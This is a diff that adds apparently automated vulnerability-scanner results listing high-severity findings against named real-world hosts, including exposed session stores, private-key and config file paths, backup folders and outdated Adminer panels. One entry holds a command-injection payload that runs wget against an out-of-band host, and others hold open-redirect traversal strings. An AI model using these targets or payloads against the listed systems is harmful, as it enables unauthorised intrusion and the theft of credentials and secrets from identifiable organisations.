@@ -1,0 +1,29 @@
+[CVE-2019-11248] [http] [high] https://influx-tnworkq43qr5xmc8.b.redstone.finance/debug/pprof/
+[CVE-2020-27361] [http] [high] https://snapshots.citrea.xyz/pme/media/
+[CVE-2021-33544] [http] [high] https://mail.particle.network//uapi-cgi/certmngr.cgi?action=createselfcert&local=anything&country=AA&state=%24(wget%20http://d98b9io226q3em32fod0pkheji5kz3g3y.oast.site)&organization=anything&organizationunit=anything&commonname=anything&days=1&type=anything
+[CVE-2022-2544] [http] [high] https://snapshots.citrea.xyz/wp/wp-content/uploads/wpjobboard/
+[CVE-2023-6114] [http] [high] https://snapshots.citrea.xyz/wp-content/backups-dup-lite/tmp/
+[CVE-2023-6505] [http] [high] https://snapshots.citrea.xyz/wp-content/uploads/prime-mover-export-files/1/
+[CVE-2025-4123:open-redirect] [http] [high] https://aevo-prod-monitor.socket.tech/public/..%2F%5coast.pro%2F%3f%2F..%2F..
+[CVE-2025-4123:open-redirect] [http] [high] https://monitor.socket.tech/public/..%2F%5coast.pro%2F%3f%2F..%2F..
+[CVE-2025-55184] [http] [high] https://alloy.dinari.com
+[CVE-2025-55184] [http] [high] https://book.arch.network/docs
+[CVE-2025-55184] [http] [high] https://campaigns.pieces.app
+[CVE-2025-55184] [http] [high] https://create-next-app.privy.io
+[CVE-2025-55184] [http] [high] https://init.privy.io
+[CVE-2025-55184] [http] [high] https://manifesto.arch.network
+[CVE-2025-55184] [http] [high] https://portal.pieces.app
+[CVE-2026-25892:version] [http] [high] https://stake-cqk-grpc.ib-local.dev.skip.build/adminer.php ["5.1.1"]
+[CVE-2026-25892:version] [http] [high] https://stake-cqk-rpc.ib-local.dev.skip.build/adminer.php ["5.1.1"]
+[CVE-2026-25892:version] [http] [high] https://stake-hab-grpc.ib-local.dev.skip.build/adminer.php ["5.1.1"]
+[CVE-2026-25892:version] [http] [high] https://stake-hab-lcd.ib-local.dev.skip.build/adminer.php ["5.1.1"]
+[CVE-2026-25892:version] [http] [high] https://stake-hab-rpc.ib-local.dev.skip.build/adminer.php ["5.1.1"]
+[CVE-2026-25892:version] [http] [high] https://stake-udm-grpc.ib-local.dev.skip.build/adminer.php ["5.1.1"]
+[CVE-2026-25892:version] [http] [high] https://stake-udm-lcd.ib-local.dev.skip.build/adminer.php ["5.1.1"]
+[CVE-2026-25892:version] [http] [high] https://stake-udm-rpc.ib-local.dev.skip.build/adminer.php ["5.1.1"]
+[CVE-2026-30824] [http] [high] https://staking-api.coredao.org/api/v1/nvidia-nim/get-token
+[laravel-sessions-exposure] [http] [high] https://snapshots.citrea.xyz/storage/framework/sessions/
+[private-key-exposure] [http] [high] https://snapshots.citrea.xyz/node_modules/mqtt/test/helpers/
+[unauth-phoenix-dashboard] [http] [high] https://phoenix-demo.arize.com/settings/general
+[wordpress-accessible-wpconfig] [http] [high] https://tokeny.com/wp-config.php.old [paths="/wp-config.php.old"]
+[wp-w3-total-cache-exposure] [http] [high] https://snapshots.citrea.xyz/wp-content/w3tc/dbcache/
